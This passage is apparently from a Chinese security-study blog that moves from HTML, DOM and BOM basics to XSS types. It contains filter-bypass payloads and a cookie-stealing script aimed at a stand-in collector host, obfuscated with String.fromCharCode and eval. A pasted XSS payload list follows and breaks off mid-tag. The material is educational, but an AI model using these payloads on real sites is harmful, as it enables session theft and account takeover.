<td align="left">‘</td>
<td align="left">撇号</td>
<td align="left">&apos; (IE不支持)</td>
<td align="left">&#39;</td>
</tr>
<tr>
<td align="left">￠</td>
<td align="left">分（cent）</td>
<td align="left">&cent;</td>
<td align="left">&#162;</td>
</tr>
<tr>
<td align="left">£</td>
<td align="left">镑（pound）</td>
<td align="left">&pound;</td>
<td align="left">&#163;</td>
</tr>
<tr>
<td align="left">¥</td>
<td align="left">元（yen）</td>
<td align="left">&yen;</td>
<td align="left">&#165;</td>
</tr>
<tr>
<td align="left">€</td>
<td align="left">欧元（euro）</td>
<td align="left">&euro;</td>
<td align="left">&#8364;</td>
</tr>
<tr>
<td align="left">§</td>
<td align="left">小节</td>
<td align="left">&sect;</td>
<td align="left">&#167;</td>
</tr>
<tr>
<td align="left">©</td>
<td align="left">版权（copyright）</td>
<td align="left">&copy;</td>
<td align="left">&#169;</td>
</tr>
<tr>
<td align="left">®</td>
<td align="left">注册商标</td>
<td align="left">&reg;</td>
<td align="left">&#174;</td>
</tr>
<tr>
<td align="left">™</td>
<td align="left">商标</td>
<td align="left">&trade;</td>
<td align="left">&#8482;</td>
</tr>
<tr>
<td align="left">×</td>
<td align="left">乘号</td>
<td align="left">&times;</td>
<td align="left">&#215;</td>
</tr>
<tr>
<td align="left">÷</td>
<td align="left">除号</td>
<td align="left">&divide;</td>
<td align="left">&#247;</td>
</tr>
</tbody></table>
<p>实体字符参考表：<a target="_blank" rel="noopener" href="https://www.w3school.com.cn/html/html_entities.asp">https://www.w3school.com.cn/html/html_entities.asp</a></p>
<p>如需完整的实体符号参考，请访问我们的 <a target="_blank" rel="noopener" href="https://www.w3school.com.cn/tags/html_ref_entities.html">HTML 实体符号参考手册</a>。</p>
<p>页面源代码和显示效果：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span>	<span class="tag">&lt;<span class="name">head</span>&gt;</span>		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span>		<span class="tag">&lt;<span class="name">title</span>&gt;</span>测试页面<span class="tag">&lt;/<span class="name">title</span>&gt;</span>	<span class="tag">&lt;/<span class="name">head</span>&gt;</span>	<span class="tag">&lt;<span class="name">body</span>&gt;</span>		<span class="tag">&lt;<span class="name">h1</span>&gt;</span>这是一级标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>		<span class="tag">&lt;<span class="name">p</span>&gt;</span>这是一个段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span>		<span class="tag">&lt;<span class="name">h1</span>&gt;</span>通过实体字符显示<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>				<span class="comment">&lt;!-- 下面两个是超链接，要有a标签 --&gt;</span>		<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.baidu.com&quot;</span> &gt;</span>点我<span class="tag">&lt;/<span class="name">a</span>&gt;</span>		<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.baidu.com&quot;</span> <span class="attr">target</span>=<span class="string">“_blank”</span>&gt;</span>百度一下<span class="tag">&lt;/<span class="name">a</span>&gt;</span>		 <span class="comment">&lt;!-- 注意，跳转的链接必须要有http:// 否则会跳转失败 ，其次，是href而不是herf，r和e的位置别搞错了 --&gt;</span> 		<span class="comment">&lt;!-- 下面是图片标签 --&gt;</span>		<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://dwz.date/efvt&quot;</span> <span class="attr">alt</span>=<span class="string">&#x27;图片加载失败&#x27;</span>&gt;</span>		<span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>显示特殊符号，使用实体字符，比如左尖括号&amp;lt   可以查看实体字符表来查看<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span>	<span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/source/hetian/image-20210203134040487.png" alt="image-20210203134040487"></p>
<p><img src="/source/hetian/image-20210203134104986.png" alt="image-20210203134104986"></p>
<h3 id="1-2-javascript基础"><a href="#1-2-javascript基础" class="headerlink" title="1.2  javascript基础"></a>1.2  javascript基础</h3><h4 id="1-2-1-基础"><a href="#1-2-1-基础" class="headerlink" title="1.2.1 基础"></a>1.2.1 基础</h4><p>javascript：在浏览器中运行，主要用于用户交互、数据处理；其和java没有关系</p>
<p>javascript存在html的哪几个地方？</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1、<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>    存在script标签中2、在<span class="tag">&lt;<span class="name">script</span>&gt;</span>的 src 属性或指定的外部文件中3、在某个HTML事件处理器中 如 onclick、onmouseover 等</span><br></pre></td></tr></table></figure>

<p><img src="/source/hetian/image-20210203134458730.png" alt="image-20210203134458730"></p>
<p><img src="/source/hetian/image-20210203134542070.png" alt="image-20210203134542070"></p>
<p><img src="/source/hetian/image-20210203134641958.png" alt="image-20210203134641958"></p>
<h4 id="1-2-2-DOM操作"><a href="#1-2-2-DOM操作" class="headerlink" title="1.2.2 DOM操作"></a>1.2.2 DOM操作</h4><p>DOM：全称：文档对象模型（DocumentObject Model ） 。 访 问 和 操 作HTML 文档的标准方法，通过利用javascript 来访问、操作 HTML。</p>
<p><img src="/source/hetian/image-20210203134854247.png" alt="image-20210203134854247"></p>
<p>一、获取 HTML 元素内容</p>
<p>1、获取元素：getElementById() 通过 ID 获取元素</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!这里是获取id为name这个元素，但是只是获取了元素--&gt;<span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&#x27;name&#x27;</span>&gt;</span>这是一个段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span>	<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&#x27;text/javascript&#x27;</span>&gt;</span><span class="javascript">		x = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;name&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>2、获取元素里的内容（alert弹窗获取）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(x.innerHTML)</span><br></pre></td></tr></table></figure>

<p>局部代码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!这里先是获取了元素，然后通过innerHTML来获取元素的内容，接着通过alert来对获取的内容进行弹窗--&gt;<span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&#x27;name&#x27;</span>&gt;</span>这是一个段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span>	<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&#x27;text/javascript&#x27;</span>&gt;</span><span class="javascript">		x = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;name&#x27;</span>);		alert(x.innerHTML);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>效果图：</p>
<p><img src="/source/hetian/image-20210203140056859.png" alt="image-20210203140056859"></p>
<p>二、修改HTML元素的内容</p>
<p>1、获取元素：getElementById() 通过 ID 获取元素</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!这里是获取id为name这个元素，但是只是获取了元素--&gt;<span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&#x27;name&#x27;</span>&gt;</span>这是一个段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span>	<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&#x27;text/javascript&#x27;</span>&gt;</span><span class="javascript">		x = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;name&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>2、修改元素：也就是将获取的元素内容进行重新赋值罢了</p>
<p>代码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span>	<span class="tag">&lt;<span class="name">head</span>&gt;</span>		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span>		<span class="tag">&lt;<span class="name">title</span>&gt;</span>测试页面<span class="tag">&lt;/<span class="name">title</span>&gt;</span>	<span class="tag">&lt;/<span class="name">head</span>&gt;</span>	<span class="tag">&lt;<span class="name">body</span>&gt;</span>		<span class="tag">&lt;<span class="name">h1</span>&gt;</span>这是一级标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>		<span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&#x27;name&#x27;</span>&gt;</span>这是一个段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span>		<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&#x27;text/javascript&#x27;</span>&gt;</span><span class="javascript">			x = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;name&#x27;</span>);			x.innerHTML=<span class="string">&#x27;内容已经被修改&#x27;</span>		</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>		<span class="tag">&lt;<span class="name">h1</span>&gt;</span>通过实体字符显示<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>			<span class="comment">&lt;!-- 	下面两个是超链接，要有a标签--&gt;</span>		<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.baidu.com&quot;</span> &gt;</span>点我<span class="tag">&lt;/<span class="name">a</span>&gt;</span>		<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.baidu.com&quot;</span> <span class="attr">target</span>=<span class="string">“_blank”</span>&gt;</span>百度一下<span class="tag">&lt;/<span class="name">a</span>&gt;</span>		&lt;!  注意，跳转的链接必须要有http:// 否则会跳转失败 ，其次，是href而不是herf，r和e的位置别搞错了 --&gt;		&lt;! 下面是图片标签--&gt;		<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://dwz.date/efvt&quot;</span> <span class="attr">alt</span>=<span class="string">&#x27;图片加载失败&#x27;</span>&gt;</span>		<span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>显示特殊符号，使用实体字符，比如左尖括号&amp;lt   可以查看实体字符表来查看<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span>	<span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span> </span><br></pre></td></tr></table></figure>



<p>效果图：</p>
<p><img src="/source/hetian/image-20210203140718369.png" alt="image-20210203140718369"></p>
<p>三、创建动态效果</p>
<p>易错点：使用iframe标签需要将write里的内容要用引号括起来,并且这里只能用双引号，用单引号没用 </p>
<p>代码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.write() 写入到 HTML 页面中document.write(&#x27;<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://www.baidu.com&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span>&#x27;);document.write(Date())</span><br></pre></td></tr></table></figure>

<p><img src="/source/hetian/image-20210203141459010.png" alt="image-20210203141459010"></p>
<p><img src="/source/hetian/image-20210203141847691.png" alt="image-20210203141847691"></p>
<p>四、添加页面交互效果</p>
<p>原理：利用事件属性onclick</p>
<p>代码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span>		<span class="tag">&lt;<span class="name">head</span>&gt;</span>		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span>		<span class="tag">&lt;<span class="name">title</span>&gt;</span>测试页面<span class="tag">&lt;/<span class="name">title</span>&gt;</span>	<span class="tag">&lt;/<span class="name">head</span>&gt;</span>	<span class="tag">&lt;<span class="name">body</span>&gt;</span>		<span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&#x27;name&#x27;</span>&gt;</span>原内容<span class="tag">&lt;/<span class="name">p</span>&gt;</span>		<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&#x27;text/javascript&#x27;</span>&gt;</span><span class="javascript">			<span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params">id</span>)			</span>&#123;				id.innerHTML=<span class="string">&#x27;已经通过点击按钮修改&#x27;</span>			&#125;		</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>		<span class="tag">&lt;<span class="name">h2</span> <span class="attr">onclick</span>=<span class="string">&#x27;change(this)&#x27;</span>&gt;</span>点击我修改<span class="tag">&lt;/<span class="name">h2</span>&gt;</span>		<span class="comment">&lt;!-- 这个h2标签必须要在script外面才行 --&gt;</span>	<span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/source/hetian/image-20210204131128534.png" alt="image-20210204131128534"></p>
<p>常用事件属性</p>
<p>onclick   单击触发</p>
<p>ondbclick  双击触发</p>
<p>onfocus  元素获得焦点</p>
<p>​    应用：练习框</p>
<p>onblur元素失去焦点</p>
<p>​    应用：表单验证，用户离开某个输入框时，代表已经输完，我们可以对它进行验证</p>
<p>onchange：域的内容被改变</p>
<p>​    应用：用于表单元素，当元素内容被改变时触发(select联动)</p>
<p>onkeydown  某个按键被按下</p>
<p>​    应用：当用户输入回车时，表单提交</p>
<p>onkeypress 某个按键被按下并松开</p>
<p>onload  一张页面或者一副图像完成加载</p>
<p>onmousedown  鼠标按钮被按下</p>
<p>onmousemove 鼠标被移动</p>
<p>mouseout 鼠标移开</p>
<p>onmouseover 鼠标移动到某元素之上</p>
<p>onselect在文本框中的文本被选中时</p>
<p>onsubmit确认按钮被点击，使用的对象是form</p>
<h4 id="1-2-3-BOM操作"><a href="#1-2-3-BOM操作" class="headerlink" title="1.2.3 BOM操作"></a>1.2.3 BOM操作</h4><p>全称：浏览器对象模型(Browser Object Model)。它使JavaScript有能力与浏览器进行“对话”。</p>
<p>使用方法：一般是通过审查元素里的控制台里进行操作</p>
<p>1、让浏览器弹出警告</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(1)    警告弹窗confirm(&#x27;你喜欢我么？&#x27;)    确认弹窗prompt(&#x27;你已经被黑&#x27;)     提示弹窗</span><br></pre></td></tr></table></figure>

<p><img src="/source/hetian/image-20210204135620572.png" alt="image-20210204135620572"></p>
<p><img src="/source/hetian/image-20210204135656922.png" alt="image-20210204135656922"></p>
<p><img src="/source/hetian/image-20210204135811179.png" alt="image-20210204135811179"></p>
<p>2、获取cookie信息</p>
<p>​    获取cookie并对cookie进行弹窗</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(document.cookie);</span><br></pre></td></tr></table></figure>

<p>​    <img src="/source/hetian/image-20210204135226578.png" alt="image-20210204135226578"></p>
<p>3、获取浏览器信息</p>
<p><img src="/source/hetian/image-20210204135401907.png" alt="image-20210204135401907"></p>
<p>4、获取页面控制信息</p>
<p><img src="/source/hetian/image-20210204135440540.png" alt="image-20210204135440540"></p>
<p>BOM操作的作用</p>
<p>1、获取和操作浏览器</p>
<p>2、它是浏览器和编程语言之间的接口</p>
<h2 id="2、Xss基础"><a href="#2、Xss基础" class="headerlink" title="2、Xss基础"></a>2、Xss基础</h2><h3 id="2-1-xss概述"><a href="#2-1-xss概述" class="headerlink" title="2.1 xss概述"></a>2.1 xss概述</h3><p>为什么不是css而是xss？</p>
<p>为了和html中的css混淆，所以使用xss</p>
<p>xss的危害</p>
<p>获取用户信息；（如浏览器信息、ip 地址、cookie 信息等）<br>1、钓鱼；（利用 xss 漏洞构造出一个登录框，骗取用户账户密码，提示登录过期，模拟一个<br>网站的登录框，将用户名、密码发送到攻击者服务器）</p>
<p>2、注入木马或广告链接；（有些在主站注入非法网站的链接，对公司的声誉有一定的影响）</p>
<p>3、 后台增删改网站数据等操作；（配合 CSRF 漏洞，骗取用户点击，利用 js 模拟浏览器发包）</p>
<p>4、xss 蠕虫（微博蠕虫：只要看过某人的微博就是自动关注某人；贴吧蠕虫：看过某个帖子就<br>自动回复）</p>
<h3 id="2-2-xss类型、场景"><a href="#2-2-xss类型、场景" class="headerlink" title="2.2 xss类型、场景"></a>2.2 xss类型、场景</h3><p>XSS一般分为3类：</p>
<p>1.反射型XSS，相对来说，危害较低，需要用户点击特定的链接才能触发。</p>
<p>2.存储型XSS，该类XSS会把攻击代码保存到数据库，所以也叫持久型XSS，因为它存在的时间是比较长的。</p>
<p>3.DOM 型XSS，这类XSS主要通过修改页面的DOM节点形成XSS，称为DOM Based XSS。</p>
<p>反射型xss</p>
<p>特点：仅执行一次，非持久型；参数型跨站脚本。<br>主要存在于攻击者将恶意脚本附加到 url 的参数中，发送给受害者，服务端未经严格过滤处理而输出在用户浏览器中，导致浏览器执行代码数据。</p>
<p>缺陷：必须要受害者访问一次就执行一次，不持久，必须访问构造的url才行，如果不点击该特定链接，则不执行</p>
<p>漏洞利用流程：</p>
<p>攻击者发现存在xss的url—-构造xss代码—对url进行伪装（编码、缩短）—发送给受害者——受害者点击——完成攻击</p>
<p>怎么发现反射型xss？</p>
<p>1、见到框框就插入</p>
<p>2、观察url，看我们输入的内容和url是否有关系</p>
<p>反射型xss的利用方法：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">经典测试 <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;hack&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>大写绕过 <span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;hack&#x27;</span>)</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span>双写绕过 &lt;scr<span class="tag">&lt;<span class="name">script</span>&gt;</span>ipt&gt;alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>其他标签 <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span> /&gt;</span></span><br></pre></td></tr></table></figure>







<p>存储型xss：危害大、更持久</p>
<p>特点：持久型。</p>
<p>主要存在于与数据库进行交互的页面。攻击者通过前端输入恶意脚本，服务器未作良好过滤进而将其存储到服务器数据库中，当用户访问包含恶意相关数据的页面时，服务端未经严格过滤处理而输出在用户浏览器中，导致受害者浏览器执行恶意代码。</p>
<p>存储型xss存在的地方</p>
<p>留言处、个人信息处等可以长久保存数据的地方</p>
<p>DOM based xss</p>
<p>特定：通过JavaScript操作document，实现修改dom节点</p>
<p>漏洞前提：主要存在于用户能修改页面的dom。也就是其源代码中通过调用函数来对页面中的内容进行修改，比如通过调用函数修改某个节点的内容，所以我们可以在输入内容这里来进行漏洞利用</p>
<p>示例代码：</p>
<p><img src="/source/hetian/image-20210205123147313.png" alt="image-20210205123147313"></p>
<p>缺陷：当我们通过DOM来修改节点时，比如InnerHTML，该innerHTML来重新赋值来实现修改，如果我们构造的赋值内容是一个script脚本，那么该脚本并不会执行，这是由DOM的特性所决定的</p>
<p>怎么绕过缺陷：</p>
<p>使用事件属性触发：onclick，onerror（需要和img进行搭配触发）</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;onclick=&#x27;alert(1)这里的两个单引号是用来闭合语句的</span><br></pre></td></tr></table></figure>



<p><img src="/source/hetian/image-20210205123453539.png" alt="image-20210205123453539"></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1)这里的开头的单引号和右尖括号是用来闭合语句的，注意哦，这个最后面不能有尖括号</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/source/hetian/image-20210205123404885.png" alt="image-20210205123404885"></p>
<p>使用eval来执行script来执行脚本，不过该脚本需要进行编码</p>
<p>​    实例：使用DOM xss来实现给指定地址发送cookie</p>
<p>​    正常代码无法使用：因为DOM无法操作innerHTML赋值来的脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;new Image().src=&quot;http://xss.com/recv_cookies.php?msg=&quot;+encodeURI(document.cookie);&lt;/script&gt;#注意：new 和Image  之间有一个空格</span><br></pre></td></tr></table></figure>

<p>​    绕过方法：既然DOM无法执行通过innerHTML赋值来的脚本，那么它本身不能干的事，我们就找帮手–eval函数来执行；并且因为不能包含空格，所以我们构造payload的时候需要构造一个没有空格的payload，所以就需要通过编码方式来绕过，比如利用String.fromCharCode函数，该函数会将数字转换为ASCII码中该数字对应的字符</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String.fromCharCode(97,108,101,114,116,40,47,120,115,115,47,41)上面这个语句执行后，结果就相当于alert(/xss/)</span><br></pre></td></tr></table></figure>

<p>接下来，再用eval执行上面的代码即可</p>
<p>ok，开始实操 ，首先将我们正常的给指定地址发送cookie的代码转换成ascii，这里可以通过火狐的hackbar来操作</p>
<p>易错点1：原payload的script的两个头和尾要去掉</p>
<p><img src="/source/hetian/image-20210205125059753.png" alt="image-20210205125059753"></p>
<p><img src="/source/hetian/image-20210205125159886.png" alt="image-20210205125159886"></p>
<p>易错点2：因为不能有空格，所以需要将转换成功的字符串里的空格所代表的的数字删掉，空格在ascii中代表着32</p>
<p>构建代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&gt;&lt;img src=1 onerror=&#x27;eval(String.fromCharCode(110, 101, 119, 32, 73, 109, 97, 103, 101, 40, 41, 46, 115, 114, 99, 61, 34, 104, 116, 116, 112, 58, 47, 47, 120, 115, 115, 46, 99, 111, 109, 47, 114, 101, 99, 118, 95, 99, 111, 111, 107, 105, 101, 115, 46, 112, 104, 112, 63, 109, 115, 103, 61, 34, 43, 101, 110, 99, 111, 100, 101, 85, 82, 73, 40, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 111, 111, 107, 105, 101, 41))#易错点：eval必须要有单引号进行闭合</span><br></pre></td></tr></table></figure>





<p>xss漏洞利用payload大全：<a target="_blank" rel="noopener" href="https://github.com/pgaijin66/XSS-Payloads/blob/master/payload/payload.txt">https://github.com/pgaijin66/XSS-Payloads/blob/master/payload/payload.txt</a></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(123);<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">ScRipT</span>&gt;</span><span class="javascript">alert(<span class="string">&quot;XSS&quot;</span>);</span><span class="tag">&lt;/<span class="name">ScRipT</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(123)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&quot;hellox worldss&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(“XSS”)<span class="tag">&lt;/<span class="name">script</span>&gt;</span> <span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(“XSS”);<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(‘XSS’)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>“&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(“XSS”)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(/XSS”)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/XSS/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>‘; alert(1);‘)alert(1);//<span class="tag">&lt;<span class="name">ScRiPt</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">sCriPt</span>&gt;</span><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">jAVasCrIPt:alert(‘XSS’)</span>&gt;</span><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">”javascript:alert(‘XSS’);”</span>&gt;</span><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">javascript:alert(&amp;quot;XSS&amp;quot;)</span>&gt;</span><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">javascript:alert(‘XSS’)</span>&gt;</span>      <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">xss</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">iframe</span> %<span class="attr">00</span> <span class="attr">src</span>=<span class="string">&quot;<span class="symbol">&amp;Tab;</span>javascript:prompt(1)<span class="symbol">&amp;Tab;</span>&quot;</span>%<span class="attr">00</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="xml">&#123;font-family<span class="symbol">&amp;colon;</span>&#x27;&lt;iframe/onload=confirm(1)&gt;&#x27;&lt;input/onmouseover=&quot;javaSCRIPT<span class="symbol">&amp;colon;</span>confirm<span class="symbol">&amp;lpar;</span>1<span class="symbol">&amp;rpar;</span>&quot;<span class="tag">&lt;<span class="name">sVg</span>&gt;</span><span class="tag">&lt;<span class="name">scRipt</span> %<span class="attr">00</span>&gt;</span><span class="handlebars"><span class="xml">alert<span class="symbol">&amp;lpar;</span>1<span class="symbol">&amp;rpar;</span> &#123;Opera&#125;&lt;img/src=`%00` onerror=this.onerror=confirm(1)<span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">isindex</span> <span class="attr">formaction</span>=<span class="string">&quot;javascript<span class="symbol">&amp;colon;</span>confirm(1)&quot;</span>&lt;<span class="attr">img</span> <span class="attr">src</span>=`%<span class="attr">00</span>`&amp;<span class="attr">NewLine</span>; <span class="attr">onerror</span>=<span class="string">alert(1)&amp;NewLine;</span>&lt;<span class="attr">script</span>/&amp;<span class="attr">Tab</span>; <span class="attr">src</span>=<span class="string">&#x27;https://dl.dropbox.com/u/13018058/js.js&#x27;</span> /&amp;<span class="attr">Tab</span>;&gt;</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">ScRipT</span> <span class="attr">5-0</span>*<span class="attr">3</span>+<span class="attr">9</span>/<span class="attr">3</span>=&gt;</span><span class="handlebars"><span class="xml">prompt(1)&lt;/ScRipT giveanswerhere=?&lt;iframe/src=&quot;data:text/html;<span class="symbol">&amp;Tab;</span>base64<span class="symbol">&amp;Tab;</span>,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==&quot;&gt;<span class="tag">&lt;<span class="name">script</span> /*%<span class="attr">00</span>*/&gt;</span><span class="handlebars"><span class="xml">/*%00*/alert(1)/*%00*/&lt;/script /*%00*/<span class="symbol">&amp;#34;</span><span class="symbol">&amp;#62;</span>&lt;h1/onmouseover=&#x27;\u0061lert(1)&#x27;&gt;%00&lt;iframe/src=&quot;data:text/html,<span class="tag">&lt;<span class="name">svg</span> &amp;#<span class="attr">111</span>;&amp;#<span class="attr">110</span>;<span class="attr">load</span>=<span class="string">alert(1)</span>&gt;</span>&quot;&gt;<span class="tag">&lt;<span class="name">meta</span> <span class="attr">content</span>=<span class="string">&quot;<span class="symbol">&amp;NewLine;</span> 1 <span class="symbol">&amp;NewLine;</span>; JAVASCRIPT<span class="symbol">&amp;colon;</span> alert(1)&quot;</span> <span class="attr">http-equiv</span>=<span class="string">&quot;refresh&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">xlink:href</span>=<span 